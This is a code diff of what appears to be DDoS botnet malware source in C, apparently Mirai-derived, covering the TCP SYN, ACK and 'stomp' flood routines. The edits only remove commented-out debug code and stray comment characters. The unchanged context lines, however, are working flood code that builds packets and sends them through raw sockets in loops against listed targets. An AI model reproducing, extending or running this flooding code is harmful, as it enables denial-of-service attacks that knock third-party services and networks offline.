@@ -151,12 +151,7 @@ void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts
 
             targs[i].sock_addr.sin_port = tcph->dest;
             sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
-        }/*
-#ifdef DEBUG
-            //break;
-            if (errno != 0)
-                printf("errno = %d\n", errno);
-#endif*/
+        }
     }
 }
 
@@ -240,12 +235,6 @@ void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts
 
         rand_str(payload, data_len);
     }
-
-//    targs[0].sock_addr.sin_port = tcph->dest;
-//    if (sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[0].sock_addr, sizeof (struct sockaddr_in)) < 1)
-//    {
-//
-//    }
 
     while (TRUE)
     {
@@ -387,7 +376,7 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
             int ret;
 
             recv_addr_len = sizeof (struct sockaddr_in);
-            ret = recvfrom(rfd, pktbuf, sizeof (pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_addr_len);///////////////////////////////////////////////////////
+            ret = recvfrom(rfd, pktbuf, sizeof (pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_addr_len);
 
 #ifdef DEBUG
         printf("[attack_tcp]attack_tcp_stomp while statrt0\n");
@@ -493,7 +482,7 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
             if (time(NULL) - start_recv > 10)
             {
 #ifdef DEBUG
-                printf("Couldn't connect to host for ACK Stomp in time. Retrying\n");//////////////////////////////////////////////////////////////////////////////////////////
+                printf("Couldn't connect to host for ACK Stomp in time. Retrying\n");
 #endif
                 close(fd);
                 goto stomp_setup_nums;
